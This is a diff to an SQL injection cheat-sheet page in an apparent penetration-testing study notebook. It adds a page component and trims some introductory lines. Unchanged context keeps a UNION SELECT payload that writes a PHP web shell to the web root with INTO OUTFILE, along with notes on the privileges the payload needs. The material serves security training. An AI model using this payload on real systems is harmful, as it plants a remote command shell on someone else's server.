@@ -5,6 +5,14 @@ description: "Confirm query context, find UNION columns, enumerate MySQL, and di
 keywords: ["sql injection", "sqli", "union select", "boolean probe", "information_schema", "load_file", "into outfile"]
 ---
 
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
 {/* COMMAND_SHORTCUT_START */}
 
 **Current starting checks:** [Web: Enumeration Methodology](/web/methodology) · [sqlmap](/commands/sqlmap)
@@ -213,12 +221,6 @@ Keep the baseline, paired proof, query shape, column layout, DBMS, and successfu
 
 Source: your [SQL Injection Fundamentals capture](/web/htb/sql-injection-fundamentals). The operational sequence above is the main reference; the capture retains the original longer lesson and transcripts.
 
-## Earlier notebook reference
-
-The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
-
-Supplementary quick reference from the existing vault site. It does not mark the module as complete.
-
 Injection into a SQL query. Confirm with a boolean/error probe, find the column count, then extract data.
 
 ```sql
@@ -247,9 +249,7 @@ Injection into a SQL query. Confirm with a boolean/error probe, find the column 
 ' UNION SELECT 1,'<?php system($_GET[0]);?>',3,4 INTO OUTFILE '/var/www/html/sh.php'-- -
 ```
 
-
 > Requires `FILE` privilege and a known, writable web root. `secure_file_priv` must permit it.
-
 
 See [SQLmap](/web/sqlmap) to automate detection and extraction.
 
